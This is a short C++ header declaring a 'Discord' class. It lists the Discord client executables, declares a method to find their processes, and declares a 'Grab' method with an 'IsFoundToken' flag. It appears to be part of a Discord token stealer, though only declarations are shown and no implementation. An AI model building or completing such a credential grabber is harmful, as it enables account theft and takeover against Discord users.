#pragma once
#include <vector>
#include <string>
#include <regex> 
#include <Windows.h> 

class Discord {
private:
	std::vector<const char*> DiscordProcess = { "Discord.exe", "DiscordPTB.exe" , "DiscordCanary.exe" };
public:
	std::vector<int> GetDiscordProcess();
	std::vector<std::string> Grab();
	bool IsFoundToken = false;
};